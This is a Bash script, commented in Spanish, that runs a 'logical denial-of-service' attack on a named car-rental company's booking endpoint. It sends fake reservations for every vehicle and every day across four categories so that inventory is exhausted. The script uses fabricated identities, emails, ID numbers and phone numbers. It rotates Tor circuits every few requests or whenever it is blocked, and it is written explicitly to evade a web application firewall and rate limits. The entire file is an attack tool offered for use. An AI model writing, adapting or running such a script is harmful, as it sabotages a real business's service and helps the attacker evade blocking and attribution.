#!/bin/bash
# 💣 OPERACIÓN ASIMÉTRICA: DoS Lógico con Rotación Tor NATIVA PARA WINDOWS

export TARGET="https://oceandrivecarental.com/server/public"
TOR="socks5h://127.0.0.1:9050"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

MAX_POR_IP=3

# Función de rotación usando PHP nativo (Porque Windows no tiene nc)
rotar_tor() {
    php -r '$f=fsockopen("127.0.0.1",9051);if($f){fwrite($f,"AUTHENTICATE \"\"\r\nSIGNAL NEWNYM\r\n");fclose($f);}'
    sleep 3
}

NOMBRES=("Andres Felipe Martinez" "Carolina Mendoza Ruiz" "Juan David Herrera" "Maria Alejandra Torres" "Santiago Lopez Giraldo" "Valentina Ospina Castro" "Camilo Restrepo" "Laura Daniela Vargas" "Sebastian Morales" "Natalia Garcia" "Felipe Ramirez" "Daniela Mejia" "Julian Henao" "Isabela Cardona" "Mateo Munoz")
DOMINIOS=("gmail.com" "hotmail.com" "outlook.com" "yahoo.com" "live.com")

echo "🚀 Ataque DoS Lógico via Tor (Infraestructura Windows)"
echo "📊 Rotación automática del circuito Tor cada $MAX_POR_IP reservas"
echo ""

TOTAL=0; OK=0; FAIL=0; CONT_IP=0

for cat in 1 2 3 4; do
    case $cat in
        1) BASE="2026-04-21"; DAYS=71; STOCK=1; TAG="ECONÓMICO" ;;
        2) BASE="2026-04-19"; DAYS=73; STOCK=2; TAG="COMPACTO" ;;
        3) BASE="2026-04-20"; DAYS=72; STOCK=3; TAG="COMPACTO+" ;;
        4) BASE="2026-04-18"; DAYS=74; STOCK=1; TAG="SUV" ;;
    esac

    echo "━━━ CAT $cat ($TAG) desde $BASE | $DAYS días | Stock: $STOCK ━━━"

    for ((d=0; d<DAYS; d++)); do
        START=$(date -d "$BASE +$d days" +%Y-%m-%d | tr -d '\r')
        END=$(date -d "$BASE +$((d+1)) days" +%Y-%m-%d | tr -d '\r')
        DIA_ID=$(date -d "$BASE +$d days" +%m%d | tr -d '\r')

        for ((u=1; u<=STOCK; u++)); do
            TOTAL=$((TOTAL+1))

            if [ $CONT_IP -ge $MAX_POR_IP ]; then
                echo -n "   🔄 Rotando circuito Tor... "
                rotar_tor
                IP_NUEVA=$(curl -s -x $TOR https://api.ipify.org)
                echo "Nueva IP: $IP_NUEVA"
                CONT_IP=0
            fi
            CONT_IP=$((CONT_IP+1))

            # 🎭 Generar identidad falsa realista (Simplificado a ASCII para evadir WAF)
            NOMBRE="${NOMBRES[$RANDOM % ${#NOMBRES[@]}]}"
            DOM="${DOMINIOS[$RANDOM % ${#DOMINIOS[@]}]}"
            # Limpieza radical: solo letras minúsculas y puntos
            EMAIL_USER=$(echo "$NOMBRE" | tr '[:upper:]' '[:lower:]' | tr -c '[:alnum:]' '.' | tr -s '.' | cut -d. -f1-2 | tr -d '\r')
            EMAIL="${EMAIL_USER}.${DIA_ID}@${DOM}"
            DOC=$((10000000 + RANDOM % 90000000))
            TEL="+5731$((1000000 + RANDOM % 9000000))"

            echo -n "[*] Cat:$cat $START (U$u) [$CONT_IP/$MAX_POR_IP] $NOMBRE... "

            printf '{"category_id":%d,"start_date":"%s","end_date":"%s","pickup_location":"Aeropuerto","dropoff_location":"Hotel","pickup_time":"12:30","dropoff_time":"10:00","customerDetails":{"name":"%s","email":"%s","phone":"%s","nationality":"Colombia","doc_type":"CC","doc_number":"%s"}}' \
                "$cat" "$START" "$END" "$NOMBRE" "$EMAIL" "$TEL" "$DOC" > test_payload.json

            RESULT=$(curl -s -x $TOR \
                -X POST "$TARGET/bookings" \
                -H "Content-Type: application/json" \
                -H "User-Agent: $UA" \
                -H "Accept: application/json, text/plain, */*" \
                -H "Accept-Language: es-CO,es;q=0.9" \
                -H "Origin: https://oceandrivecarental.com" \
                -H "Referer: https://oceandrivecarental.com/reservar" \
                -d @test_payload.json)

            MSG=$(echo "$RESULT" | jq -r '.message // .error // "Sin respuesta"' 2>/dev/null)
            if echo "$MSG" | grep -qi "confirmed"; then
                echo "✅ CONFIRMADA"
                OK=$((OK+1))
            elif echo "$MSG" | grep -qi "Polic\|limit\|block"; then
                echo "🚫 IP quemada → Forzando rotación"
                CONT_IP=$MAX_POR_IP
                FAIL=$((FAIL+1))
            else
                echo "⚠️ $MSG"
                FAIL=$((FAIL+1))
            fi

            sleep $(( (RANDOM % 2) + 1 ))
        done
    done
done

rm -f test_payload.json
echo ""
echo "══════════════════════════════════════"
echo "📊 RESULTADOS (Windows + Tor)"
echo "══════════════════════════════════════"
echo "Total:    $TOTAL"
echo "✅ OK:    $OK"
echo "🚫 Fail:  $FAIL"
echo "Éxito:    $(( OK * 100 / (TOTAL > 0 ? TOTAL : 1) ))%"
